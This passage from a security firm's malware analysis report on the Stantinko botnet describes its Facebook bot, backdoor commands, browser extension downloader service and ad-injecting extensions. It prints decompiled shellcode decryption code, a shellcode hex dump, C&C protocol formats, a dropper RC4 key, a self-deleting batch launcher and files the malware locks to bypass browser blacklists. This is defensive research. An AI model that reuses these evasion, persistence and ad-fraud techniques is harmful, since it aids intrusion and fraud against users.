5.1)\n```\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36).\n\n```\nThis module relies on the same C&C server as the brute-force module. It uses the hardcoded URL:\n```\nhxxp://185.28.22.22/social/bot/fbs.php. The communications are not encrypted but some\n\n```\nparameters of the reply can be encrypted using the bot ID value that is sent in the uid parameter\nof the request.\n\nThe bot is able to create new Facebook profiles. Facebook requires a valid email address to create\na fully working account. This plugin relies on several free email providers listed in Figure 47.\n\n```\nrambler.ru\nmail.ru\nyandex.ru\nlenta.ru\nautorambler.ru\nmyrambler.ru\n\n```\n```\nro.ru\nr0.ru\nmail.ua\nbk.ru\ninbox.ru\nlist.ru\n\n```\n\nFigure 47. Supported e-mail providers\n\nOnce an account is created, it can interact with Facebook. The bot can update its personal\ninformation, like its relationship status or its current city. It also has the ability to interact with other\naccounts by adding them as friends, sending messages, liking pictures or joining groups. A list\nof all the implemented actions is provided in Table 6.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nTable 6. List of actions of the Facebook bot\n\n\nAddFriend AddGroup AddMembersToGroup ApproveEmail Comment\n\nCommentOther DeleteComment DeleteFriend DeleteGroup DeletePost\n\nFindPage GetAllIdFriends GetAllIdGroups GetAllIdMembers GetFriendRequest\n\nInfoPost Like Login Logout Post\n\nReadMessage Recommendate Registration Repost SetAvatar\n\nSetHeader SetSettings Sleep UnBan UnLike\n\nTo perform these actions, the module has a lot of Facebook URLs and HTML tags related\nto Facebook pages. However, it doesn’t take decisions on its own. It will only execute what it is asked\nby the C&C server.\n\nFake accounts constitute a problem known by Facebook itself, which have mitigation techniques\nto prevent bots from accessing Facebook websites. For example, a captcha can be required to perform\nan action. However, captchas are easily bypassed by Stantinko’s Facebook module. It uses an online\nservice, anti-captcha.com, to solve them.\n\nFigure 48. Anti-captcha.com homepage\n\nThis anti-captcha website is a paid service. Captchas are solved by individuals who receive a percentage\n[of the fee. It costs US$ 0.70 per 1000 captchas or US$ 2 per 1000 reCAPTCHAs. This service has a bid](https://www.google.com/recaptcha/)\nmechanism so you can increase the price if you want to solve your captcha faster.\n\nThe bot uses a hardcoded account key that is not currently valid in March 2017. Interestingly,\nit is possible to check the global load and minimum prices of this service.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ Amount of workers waiting for an English (Latin) captcha.\n\n➋ Amount of workers waiting for a Russian (Cyrillic) captcha.\n\n➌ Demand/supply ratio. A high value means that the majority of workers\nare busy.\n\n➍ Minimum price in US$ for an English (Latin) captcha.\n\n➎ Minimum price in US$ for a Russian (Cyrillic) captcha.\n\n➏ Average solve time in seconds for an English (Latin) captcha.\n\n➐ Average solve time in seconds for a Russian (Cyrillic) captcha.\n\nFigure 49. Load of anti-captcha.com on 24/03/2017\n\n**LIVE FAKE ACCOUNTS**\n\nUnfortunately, we were not able to monitor the activity of Stantinko’s Facebook bot.\nOur fake bot only received commands from the C&C server asking it to sleep. It would have\nbeen interesting to monitor the final purpose of this bot, but it looks like it is either\nnot used anymore by its operators or still a work in progress.\n\n###### 5.3.6. Radmin\n\nThe genuine Radmin is legitimate remote control software by Famatech for Microsoft Windows.\nHowever, this module is a custom backdoor and has nothing to do with the legitimate program.\n\nThis is a typical backdoor that can be used for any purpose as it has total control over the compromised\nmachine. Like most of the other components, the reply from the server is encrypted using RC4\nwith the bot ID.\n\nThe list of the available functions is self-explanatory and it ranges from reconnaissance to data\nexfiltration. The full list is provided in Table 7.\n\n\nTable 7. List of commands implemented in the remote control plugin\n\n\ncreate_dir delete_file do_archive exec find_files\n\nget_drives get_file httpget kill ls\n\nproclist reboot reg rename_file save_file\n\nstart_svc stop_svc svclist sysinfo upload_file\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe C&C server URL is hardcoded. In the module we have analyzed, it is: hxxp://93.188.161.17:8000.\nOther Stantinko components had C&C server domains such as wsslupdate[.]org, wsslupd[.]org\nor nvccupdate[.]com that resolve (or resolved) to this IP address.\n\n###### 5.3.7. ZAXAR Cleaner\n\nThis is the last PDS’s plugin we describe and assuredly the most “useful”. It is responsible for cleaning\nthe Zaxar and MSCInfo adware from the machine. Interestingly, Zaxar is installed at the same time\nas Adstantinko. While we have no information regarding the links between Stantinko and these two\nadware, it is possible that they are competitors installed by the same Pay-Per-Install platform.\n\nIt was amusing to realize that Stantinko has a module to clean adware from the infected machine.\nIt is also interesting that they install the legitimate Kaspersky AVZ Antiviral Toolkit to perform this task.\n\nThe AVZ Antiviral Toolkit is downloaded from hxxp://176.126.245.51/avz.exe. The SHA-1 hash\nof the avz.exe file is EFC45773F5A260249968641F987EE7314CADCB3E. The module embeds\na script that is then fed to the AVZ program to clean the computer. It is provided in Appendix C.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 6. BROWSER EXTENSION DOWNLOADER SERVICE (BEDS)\n\nIn this section, we’ll present the second persistent service that Stantinko installs on successfully\ncompromised machines. In the usual timeline, this component is dropped by the PDS and is the last\nservice to be installed. Like the PDS, the code responsible for the communication with the C&C\nis encrypted. However, it is stored in the Windows Registry instead of in a different DLL file.\nThe BEDS also has a very flexible plugin mechanism based on an embedded PE loader.\n\nWe encountered the early versions of this component in Stantinko’s first campaigns. The binaries\nwere neither obfuscated nor encrypted except for the C&C server addresses.\n\n###### 6.1. Overview\n\nIn this section, we’ll describe the last component to be installed on a compromised host. Like\nthe two other Stantinko services, it basically downloads and executes files received from\nthe C&C server. The PE loader is included to run these plugins. The final purpose of this component\nis to install browser extensions.\n\nA feature unique to the BEDS is that some of its code is encrypted and stored in the Windows\nRegistry. It is decrypted at runtime using the volume serial number as the key. Moreover, as time\npassed, Stantinko developers began to use custom obfuscators to slow down the analysis.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFigure 50. Overview of the Browser Extension Downloader Service\n\nThis component is installed as a service similar to the PDS. That’s how it achieves persistence.\n\nAs is the case for many of the malware’s components, the BEDS has multiple variants — or “service\ntypes”, as the authors call them. At time of writing, three variants were observed. The following code\nwas found in KBDMAI_ExtInstaller.dll, one of its plugins. It checks what variant is installed\non the infected machine.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n[...]\nif ( F_is_service_ihctrl32() == 1 )\n{\n  log_str = “SERVICE TYPE IS IHCTRL32”;\n}\nelse if ( F_is_service_themctrl() == 1 )\n{\n  service_type = 1;\n  log_str = “SERVICE TYPE IS THEMCTRL”;\n}\nelse\n{\n  if ( F_is_service_optsatadc() != 1 )\n  {\n    v3 = “Ihctrl32InjectedCode::Initialize() == false &&\nThemctrlSrvInjectedCode::Initialize() == false”;\n    goto LABEL_48;\n  }\n  service_type = 2;\n  log_str = “SERVICE TYPE IS OPTSATADC”;\n}\n[...]\n\n```\n\nFigure 51. Hex-Rays output of installed services check\n\nHere’s a table that displays the different services and their description.\n\n\nTable 8 Service types\n\n\nComponent name Service name Service Description\n\n\nService for diagnostics and\n`optsatadc.dll` optimization of SATA devices\nperformance\n\n\nAllows to diagnose, maintain and improve\nthe performance of devices connected via\nSATA interface\n\n\nThe service allows you to add advanced\n`themctrl.dll` Service Control Panel themes\ndesktop themes\n\n\nIntel® Host Controller Interface\n```\nihctrl32.dll\n```\n(non-volatile memory)\n\n\nHost Controller Interface (non-volatile\nmemory), an interface that enables\nSATA Express / NVM Express SSDs to\ncommunicate with a driver\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe various services of the BEDS also embed open source projects available on the Internet.\nStantinko’s authors seem to start all of their components from open source projects to which\nthey add their code. We can find the usage strings of these projects in the services code. Here’s a list\nof the mimicked software per service.\n\n\nTable 9. Mimicked software\n\n\nComponent name Mimicked software Software website\n\n\nCheck disk utility from\n```\noptsatadc.dll\n```\nFreeDos\n\n\n[https://github.com/joyent/sdcboot/blob/master/](https://github.com/joyent/sdcboot/blob/master/freedos/source/chkdsk/chkdsk.c)\n[freedos/source/chkdsk/chkdsk.c](https://github.com/joyent/sdcboot/blob/master/freedos/source/chkdsk/chkdsk.c)\n\n\n`themctrl.dll` ImgDiff [https://github.com/caosdoar/imgdiff](https://github.com/caosdoar/imgdiff)\n\n\nfxload: A Firmware\n```\nihctrl32.dll\n```\nuploader using libusb\n\n\n[https://github.com/libusb/libusb/blob/master/](https://github.com/libusb/libusb/blob/master/examples/fxload.c)\n[examples/fxload.c](https://github.com/libusb/libusb/blob/master/examples/fxload.c)\n\n\n###### 6.2. Browser Extension Downloader Service Analysis\n\n 6.2.1. Encrypted Shellcode\n\nTo avoid detection, the BEDS doesn’t embed any malicious code in the DLL dropped on the disk. Instead,\nthe code used to communicate with the C&C is stored in the Windows Registry and is encrypted.\nThe encryption key is not stored anywhere since it is based on the volume serial number. Thus,\nit is almost impossible to get access to the full code unless you have access to the compromised\nmachine’s Registry as well as the volume serial number. The best way to analyze this component\nis by hunting for the dropper. That is how we managed to analyze it, by extracting the dropper\nfrom fdclient.dll version 3.xx.\n\nThe encrypted shellcode is stored in one of the following Windows Registry key depending\non which variant of the service is installed:\n\n- `HKLM\\System\\CurrentControlSet\\Services\\ihctrl32\\FailureActions`\n\n- `HKLM\\System\\CurrentControlSet\\Services\\optsatadc\\LastOptimizedDevice`\n\n- `HKLM\\System\\CurrentControlSet\\Services\\themctrl\\DefaultTheme`\n\nIt is encrypted using a seemingly custom rotation-based algorithm. The key is the volume serial\nnumber. After each iteration, the key is rotated by 2 bits to the left. For each byte of the encrypted\nshellcode, the 2 least significant bits plus 1 define the number of rotations to the left to be made\non the byte. The code shown in Figure 52 is doing these operations.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\nDWORD __usercall F_decrypt_shellcode@<eax>(DWORD volume_sn@<eax>,\n_BYTE *encrypted_shellcode, int shellcode_size, DWORD volume_\nsn_1)\n{\n  _BYTE *encrypted_shellcode_ptr; // edi@4\n  int size; // ebx@4\n  DWORD rotating_key; // eax@4\n  char decrypted_byte; // dl@5\n  DWORD volume_sn_2; // [esp-20h] [ebp-2Ch]@4\n  if ( encrypted_shellcode && shellcode_size )\n  {\n    volume_sn_2 = volume_sn;\n    encrypted_shellcode_ptr = encrypted_shellcode;\n    size = shellcode_size;\n    rotating_key = volume_sn_1;\n    do\n    {\n      decrypted_byte = __ROL1__(*encrypted_shellcode_ptr,\n(rotating_key & 3) + 1);\n      *encrypted_shellcode_ptr = decrypted_byte;\n      rotating_key = __ROR4__(rotating_key, 2);\n      ++encrypted_shellcode_ptr;\n      --size;\n    }\n    while ( size );\n    volume_sn = volume_sn_2;\n  }\n  return volume_sn;\n}\n\n```\n\nFigure 52. Hex-Rays output of the shellcode decryption routine\n\nOnce decrypted, a function of the shellcode is copied over a function from the legitimate open source\nproject. This newly-copied function resolves kernel32.dll imports using a hash for each import\nname. It is used to import VirtualProtect and to set protection of the shellcode allocated page to\n```\nPAGE_EXECUTE_READWRITE.\n\n```\nFigure 53. Function before and after code injection\n\n\nOnce decrypted, a function of the shellcode is copied over a function from the legitimate open source\nproject. This newly-copied function resolves kernel32.dll imports using a hash for each import\nname. It is used to import VirtualProtect and to set protection of the shellcode allocated page to\n```\nPAGE_EXECUTE_READWRITE.\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe first part of the shellcode structure contains an array of offsets to the code of each of its functions.\nThis array contains 57 offsets. After this array, the code begins. To resolve functions, it stores the array\nof offsets and the pointer to the base of the code in global variables. Before calling a function,\nthe program adds the desired function offset to the base and jumps to the computed address.\n```\n        0000h: 00 00 00 00 E0 00 00 00 D0 0A 00 00 30 0B 00 00\n        0010h: 50 0B 00 00 80 0B 00 00 80 0C 00 00 40 0D 00 00\n        0020h: E0 0E 00 00 E0 0F 00 00 E0 0F 00 00 00 10 00 00\n        0030h: 00 10 00 00 30 10 00 00 70 10 00 00 C0 10 00 00\n        0040h: 70 11 00 00 D0 12 00 00 50 13 00 00 E0 13 00 00\n        0050h: 30 14 00 00 A0 14 00 00 00 15 00 00 30 15 00 00\n\n```\n`0060h: E0 15 00 00 B0 16 00 00 80 1D 00 00 D0 1D 00 00` Offsets\n`0070h: 20 1E 00 00 90 1E 00 00 F0 1F 00 00 D0 21 00 00` array\n```\n        0080h: D0 23 00 00 00 24 00 00 90 26 00 00 B0 26 00 00\n        0090h: 00 27 00 00 30 27 00 00 E0 27 00 00 40 28 00 00\n        00A0h: 40 29 00 00 70 2B 00 00 60 2D 00 00 D0 2E 00 00\n        00B0h: 30 30 00 00 B0 30 00 00 30 31 00 00 10 32 00 00\n        00C0h: 30 33 00 00 60 35 00 00 C0 38 00 00 40 39 00 00\n        00D0h: C0 39 00 00 A0 40 00 00 D0 41 00 00 F0 45 00 00\n        00E0h: F0 48 00 00 55 8B EC 81 EC 04 01 00 00 33 C0 EB\n        00F0h: 03 8D 49 00 0F B6 C8 88 84 0D FC FE FF FF 40 3D\n        0100h: 00 01 00 00 72 EE 53 56 8B 75 10 33 C9 32 D2 57\n        0110h: 89 4D FC 33 C0 0F B6 1C 30 8D BC 0D FC FE FF FF\n        0120h: 8A 0F 02 D9 02 D3 0F B6 F2 0F B6 9C 35 FC FE FF\n        0130h: FF 8D B4 35 FC FE FF FF 88 1F 88 0E 8B 75 10 40\n        0140h: 80 3C 30 00 75 02 33 C0 8B 4D FC 41 89 4D FC 81\n        0150h: F9 00 01 00 00 72 BE 33 C0 32 DB 32 D2 39 45 0C\n        0160h: 76 4F EB 03 8A 5D 13 FE C2 0F B6 F2 8A 8C 35 FC\n        0170h: FE FF FF 8D B4 35 FC FE FF FF 02 D9 0F B6 FB 88\n\n```\nShellcode\n```\n        0180h: 5D 13 0F B6 9C 3D FC FE FF FF 8D BC 3D FC FE FF\n        0190h: FF 88 1E 88 0F 0F B6 1E 8B 75 08 02 D9 0F B6 CB\n        01A0h: 0F B6 8C 0D FC FE FF FF 30 0C 30 40 3B 45 0C 72\n        01B0h: B3 5F 5E 5B 8B E5 5D C2 0C 00 CC CC CC CC CC CC\n        01C0h: CC CC CC CC 55 8B EC 81 EC 00 04 00 00 C7 85 00\n        01D0h: FC FF FF 00 00 00 00 C7 85 04 FC FF FF 96 30 07\n        01E0h: 77 C7 85 08 FC FF FF 2C 61 0E EE C7 85 0C FC FF\n        01F0h: FF BA 51 09 99 C7 85 10 FC FF FF 19 C4 6D 07 C7\n        0200h: 85 14 FC FF FF 8F F4 6A 70 C7 85 18 FC FF FF 35\n        [...]\n\n```\nFigure 54. First part of the shellcode\n\n###### 6.2.2. Networking\n\nThe C&C server’s address is in the encrypted shellcode stored in the Windows Registry. The domain\nis stored using string stacking in the function that calls InternetConnect. Here’s a list\nof the domains per service variant:\n\n\nTable 10. Command and control servers per service type\n\n\nService type Domain URL\n\n`opsatadc.dll` hdr-group[.]org hxxp://hdr-group.org/optimize.php\n\n`themctrl.dll` robothemes[.]net hxxp://robothemes.net/index.php\n\n`ihctrl32.dll` icloudsrv[.]com hxxp://icloudsrv.com/idx.php\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nInterestingly, to avoid domain blacklisting, the C&C server domains have a proper website. Each\none has different content related to the domain name. For example, Figure 55 shows the homepage\nof hxxp://robothemes.net.\n\nFigure 55. `Robothemes[.]net Homepage`\n\nFor simplicity, we’ll use the ihctrl32.dll URLs for the description of the protocol. The URL changes\nbased on what variant is installed. Refer to the command and control section (Table 4) to see what\nURL is used for the other services.\n\n###### Client Protocol\n\nTo contact its C&C server, the BEDS sends two subsequent POST requests to its target URL. The first\none is empty, and the second one contains a report whose format will be described in this section.\n\n```\nPOST /idx.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: icloudsrv.com\nContent-Length: 2788\nConnection: Keep-Alive\nCache-Control: no-cache\ndate=492322182&data=<BASE64-encoded data>\n\n```\n\nFigure 56. Second Request\n\nThe report is encrypted using RC4 and is then base64-encoded. It is stored in the data parameter.\nThe RC4 key is the MD5 hex digest of the date parameter. There are two types of reports that the BEDS\ncan send:\n\n- A Notify report containing various information about the state of the compromised machine\n\n- A Download report asking to download a plugin or an update\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n`MD5` Notify i.e. 1000_1234567\n\nBot ID Action Group ID Running Installed\nprocess list extensions\n\n➊\n\n\nRunning plugins Service type Volume serial\n\n➋ ➌ number\n\nBetween each field, the separation marker is @@.\n\n➊ The installed extensions field contains a list of all installed browser\nextensions. This list is stored under the service Registry key HKLM\\SYSTEM\\\n```\n    CurrentControlSet\\services\\<Service name>\\Parameters\\\n    System\\. During our investigation, we’ve seen two values:\n\n```\n `iha1e: This value is created if the browser extension The Safe Surfing`\nis installed.\n\n `tdiha1e: This value is created if the browser extension Teddy Protection`\nis installed.\n\n➋ The running plugins field contains an enumeration of running\ncomponents and their versions (This includes the plugins loaded in memory\nand the service DLL). They are separated by || i.e. ihctrl32:1.14|\n|certificatecreate:1.11||certificate:1.12||SafeSurfing:1.15\n\n➌ An integer indicating the variant:\n\n `20: ihctrl32.dll`\n\n `30: themctrl.dll`\n\n `40: optsatadc.dll`\n\nFigure 57. Notify report format\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nDownload\n\nBot ID Action Group ID Component\nto download\n\nService type Volume serial\nnumber\n\nAll the common fields are the same as those in the Notify report\nexcept for Action, which is set to Download.\n\nFigure 58. Download report format\n\n###### Server Protocol\n\nThe server responds to the first empty request with a HTTP 200 response code and an empty body.\nThen, the server responds to the second request with base64-encoded data. The decoded response\nis shown in Figure 59.\n\n```\ndate=52057&data=<RC4-encrypted payload>\n\n```\n\nFigure 59. Base64-decoded reply\n\nThe content of the data parameter is the response payload. It is RC4-encrypted with the MD5 hex digest\nof the date as the encryption key. There are two types of payload that can be sent by the C&C server,\ncorresponding to the two report types. If it is a Notify report, the C&C server replies with a JSONformatted command asking the bot to download or delete components. The bot will then send\n```\nDownload reports for each component it is asked to download. The response to the Download\n\n```\nreport is a PE file with the code to execute.\n\nThe server respond to a Notify report with one or multiple JSON sub-reports that has the following\nformat. A marker is used to separate each sub-report.\n```\n                     0xE53199D0A77BA623\n\n```\n**0** **8** **12**\n\nMarker CRC32 JSON object\n\n➊ ➋\n\n➊ The CRC32 of the JSON object\n\n➋ The JSON containing a task\n\nFigure 60. Reply format for a NOTIFY report\n\nThe JSON has the following format:\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ There are two modes:\n```\n       0 The component is available for download\n       1 Delete the given component (in which case only the “alias” field is parsed)\n\n```\n➋ The name of the component\n\n➌ What to do with the downloaded file\n```\n       1000 Execute and drop an encrypted version on the file system\n       1001 This is an update for the persistent service DLL\n       1002 Directly run the component in-memory\n\n```\n➍ Major version of the advertised component\n\n➎ Minor version of the advertised component\n\nFigure 61. JSON format\n```\n                       0xE53199D0A77BA623 0x7B\n\n```\n**0** **8** **12** **13**\n\nMarker CRC32 ZLIB\n\n➊ compressed PE\n\nMarker\n\n➊ The CRC32 field contains the checksum of the zlib\ncompressed PE\n\nFigure 62. Download response format\n\n###### 6.2.3. How to Extract The Embedded Dropper\n\nIn this section, we’ll give more details about how to extract the embedded dropper when available.\nThe extraction process we described for the PDS is easier than this one because there’s no straightforward way to find where the encrypted dropper resides in the binary. However, we can take\nadvantage of its large size in order to find it.\n\nOpening the binary in IDA, we notice that there’s a huge .data section at the end of the binary.\n\n|0 8|8 12|2 13|3|\n|---|---|---|---|\n|||||\n|Marker CRC32 ZLIB ➊ compressed PE||||\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFigure 63. View of the sections of the BEDS in IDA\n\nIn that huge section, we need to find a reference to a huge blob that ends a few hundred kilobytes\nfurther on with another reference. The end reference is used to get the length of the blob. The end\nof the blob is shown in Figure 64.\n\nFigure 64. End of the embedded dropper\n\nThe next step is to decrypt the dropper using the RC4 algorithm with this key:\n```\n“\\x7e\\x5e\\x7f\\x8c\\x08\\x46”. The resulting blob is compressed using zlib.\n\n###### 6.3. Plugins\n\n```\nThe BEDS has a very flexible plugin system. It is very similar to the other Stantinko components:\nthe server can send any PE that will be loaded directly into memory without the need to write\nthe file to disk. The plugins we’ve seen so far are all related to browser extension installations.\nThis is why we decided to call it the Browser Extension Downloader Service.\n\n###### 6.3.1. Browser Extension Installer\n\nIn this section, we will present the extensions that are installed by the BEDS. All these extensions\nare installed with a plugin named KBDMAI_ExtInstaller.dll by Stantinko’s authors. This plugin\nembeds a zip file containing the extension to install. Multiple browsers are targeted by the plugin\naccording to the path where they install the extensions. Figure 65 shows a list of browsers\ntargeted by this plugin.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\nChrome\nFirefox\nCrossbrowser\nBromium\nChromium\nOrbitum\nTorch\nuCozMedia Uran\n\n```\n```\nPlayFree Browser\nMapleStudio ChromePlus\nComodo Dragon\nNichrome\nXpom\nKometa\nYandex\nOpera\n\n```\n\nFigure 65. Browsers targeted by KBDMAI_ExtInstaller.dll\n\nAlso, multiple browser preference files are modified to add the extensions to the software. The list\nis provided in Annexe A.5.\n\nWe’ve only happened upon two different zip files embedded into KBDMAI_ExtInstaller.dll.\nThe first one contains The Safe Surfing while the second one contains Teddy Protection. These browser\nextensions are actually malicious. They are described in Section 6.4.\n\n###### 6.3.2. ClearCache\n\nThe first plugin that is usually sent to a machine compromised by the BEDS is clearcache.dll.\nThere are two different PE files related to it. The first one drops the DLL while the second\none executes it. The author named the former file certificate_create.dll and the latter\ncertificate.dll, according to the file metadata. The %TEMP% directory location is retrieved\nvia the GetTmpPath Win32 API and the DLL is dropped there. Once dropped, the second plugin\nis sent. In the same TEMP directory it writes a batch file containing a command to launch\n```\nclearcache.dll and then to delete itself.\n\n```\n```\nstart rundll32 “%temp%\\clearcache.dll”, DllMain\ndel %0\n\n```\n\nFigure 66. clearcache.bat\n\nThis BATfile is then launched using CreateProcess.\n\nIt is still unclear what this plugin actually does, but we believe it is a browser blacklist bypass\nfor the Amigo and the Yandex browsers. However, we did not notice any change when we tried\nto install Stantinko’s browser plugins with or without clearcache.dll running.\n\nFirst, the DLL retrieves possible paths where Yandex and Amigo might store their blacklist files.\nThen, it builds all paths possible by concatenating all the base paths from CSIDL_COMMON_DOCUMENTS\nand CSIDL_LOCAL_APPDATA with the trailing paths shown in Figure 67.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n[“Amigo\\User Data\\amigo_safe\\check_policy.amg”,\n “Amigo\\User Data\\amigo_safe\\check_policy.amg.new”,\n “Yandex\\YandexBrowser\\User Data\\Safe Browsing Extension\nBlacklist”,\n “Yandex\\YandexBrowser\\User Data\\Safe Browsing Extension\nBlacklist_new”,\n “Amigo\\Application\\*\\check_policy.amg”,\n “Amigo\\Application\\*\\check_policy.amg.new”]\n\n```\n\nFigure 67. Files opened by clearcache\n\nIf the file exists, clearcache.dll opens a handle to the file. Once it finishes iterating over every\npossible path, it enters an infinite loop. That way, as long as it is running, no other program is able\nto open those files. We believe that, at some point, the Amigo and Yandex browsers skipped the check\nif they failed to open the file containing the blacklisted extensions.\n\n###### 6.3.3. Reset SafeSurfing Flag\n\nReset SafeSurfing Flag is a little plugin whose purpose is to erase the Registry key that exists when\n_The Safe Surfing browser extension is installed. It might be used when the operators figure out that_\nthe user of an infected machine was able to uninstall the browser extension so the C&C can send\nthe plugin installer again.\n\nDepending on what service type is installed, it will delete one of the following values:\n\n- `HKLM\\SYSTEM\\CurrentControlSet\\services\\optsatadc\\Parameters\\System\\iha1e`\n\n- `HKLM\\SYSTEM\\CurrentControlSet\\services\\themctrl\\Parameters\\System\\iha1e`\n\n- `HKLM\\SYSTEM\\CurrentControlSet\\services\\ihctrl32\\Parameters\\System\\iha1e`\n\n###### 6.4. Browser Extensions\n\nIn this section, we will describe the browser extensions APIHelper, The Safe Surfing, and Teddy Protection.\nThey perform ad injections and redirections to some websites. We believe they are among the most\nprofitable payloads of the Stantinko malware family.\n\n###### 6.4.1. APIHelper\n\nThe APIHelper browser extension is the ancestor of The Safe Surfing. Based on compilation timestamps\nand domain name registration dates, we believe this operation has been running since at least 2014.\nEven if it is no longer distributed, all the infrastructure is still up and we were able to identify some\nremaining compromised machines. There are two different versions, one for Internet Explorer, which\nis a Browser Helper Object, and one for Chrome/Firefox/Opera that contains HTML, JavaScript\nand a 32-bits NPAPI DLL called npapihelper.dll.\n\nThis extension mainly uses two JavaScript files: bg.js, which runs in background and cnt.js,\nwhich runs in the context of the page.\n\nThe first script is responsible for checking the tab’s URL and redirecting the user under certain\nconditions. It is performed by registering a callback to the beforeNavigate event, as shown\nin Figure 68. We will describe the configuration file later in this section.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ Call the DLL with the tab’s URL as argument. The DLL will check the\nconfiguration and return the new URL if it matched one of the rules.\n\n➋ If the returned URL is not empty, the tab’s URL is modified.\n\nFigure 68. APIHelper background script\n\nThe second script, cnt.js, is used to inject scripts in all pages. As for the background script,\nit registers a callback to an event, DOMContentLoaded, and injects the script provided by the DLL\nas shown in Figure 69.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ Call the DLL with the tab’s URL, title and the content of the keywords\nand description meta tags as argument. The DLL will check the\nconfiguration and return the URL of the script to inject if it matches one\nof the rules.\n\n➋ Create a script tag, fill the URL of the script and inject the script.\n\n➌ Sometimes, it loads the JavaScript code and add it to the page.\n\nFigure 69. APIHelper content script\n\nAs detailed above, the DLL is used to manage the configuration and to check the URLs against\nthe patterns it contains. It is also used to access the Registry keys that cannot be accessed directly\nfrom JavaScript. However, the NPAPI technology has been discontinued in all major browsers.\nIn the new extension, named The Safe Surfing, they switched to PPAPI executables.\n\nBefore being able to inject ads, the extension needs to retrieve its configuration. It is done\nby performing a GET request to apihelper.org:\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\nGET /\n/config.php?cparam=S0s3EzEgBBSe9ljmhdVySTkTP6+Uz4tJ3xBfrFnfidgTr\nQmWbkkxR+PK22N3EU0JBBqJtjPxzEDHJqCFrbf9ZCtsTRbwkYDGuTivga+EMBfey\n8sb9aSXVg==&task=cfg&xhg=04FE1480 HTTP/1.1\nAccept: text/html, application/xhtml+xml, */*\nReferer: http://google.com/\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;\nrv:11.0) like Gecko\nAccept-Encoding: gzip, deflate\nHost: apihelper.org\nDNT: 1\nConnection: Keep-Alive\n\n```\n\nFigure 70. Get request to apihelper[.]org\n\nThe cparam parameter contains data encrypted with a custom algorithm. It’s the same used by the\n```\nWin32/Extenbro.DE trojan, as shown in Section 3.3.5. The decrypted cparam looks like this:\n\n```\n```\nkey=<hardcoded value (3faf033cf35c4290ac2a4c6b2989f282)>\n&vplg=<plugin_version>&id=<user_id>\n\n```\n\nFigure 71. Decrypted cparam\n\nThe reply is the configuration encrypted with RC4 and zlib-compressed. It has the KK magic bytes in\nthe header like Win32/Extenbro.DE. It is stored in HKCU\\SOFTWARE\\APIHelper\\cfg. Part of the\nconfiguration is provided in Figure 72.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ Time in seconds between two updates of the configuration file. The last\ntimestamp update is stored in HKCU\\SOFTWARE\\APIHelper\\_ts\n\n➋ The list of domains for which this rule is applied.\n\n➌ The URL of the script to be injected.\n\n➍ These scripts will be downloaded and then included in the page between\ntwo script tags.\n\n➎ The generic URL used when none is provided. %base64% will be replaced\nby the URL to which the user should be redirected by the proxy.\nIt is base64-encoded and encrypted with RC4.\n\n➏ No redirection happens if the URL contains this value.\n\n➐ The key used to encrypt the %base64% value.\n\n➑ The URL pattern for which the rule is applied.\n\n➒ The type of website. Type 1 means that it is the URL of a publisher.\n\n10 The redirection mode. For the mode 1, the user is redirected to the URL\ngiven in the get field. If it is empty, the user will be redirected\nby the proxy to the URL he entered.\n\n11 No redirection happens if the URL contains this value.\n\n12 The “proxy” URL. The user is first redirected to this URL. The variable\n```\n       %source% contains the URL requested by the user. It is base64-encoded\n\n```\nand encrypted with RC4, using the key provided above.\n\n13 When this field is not empty, the user is finally redirected to this URL\nrather than the URL he typed or clicked.\n\n14 In mode 2, the query part of the URL will be replaced by the string\nprovided in the get field. It generally replaces parameters that are used\nby the ad networks to identify the publisher that sent the visitor. Thus,\nStantinko operators can be paid for traffic generated by other publishers.\n\n15 In mode 3, some parameters of the query part of the URL will be replaced\nby the ones provided in the get field.\n\n16 The type 2 websites are ad networks or ad exchanges. It uses the php_\n```\n       redirect_script URL as a proxy.\n\n```\nFigure 72. APIHelper configuration sample\n\nAll the scripts that are injected in the targeted websites such as Yandex or Mail.Ru look very similar.\nWe even found an old script that was injecting ads into Google results. They embed a hardcoded list\nof pictures or Flash video URLs along with the URL to which the user will be redirected when he clicks\non the ad. Figure 73 is a part of the script injected in Mail.Ru that replaces the top banner.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\nvar off_0 = 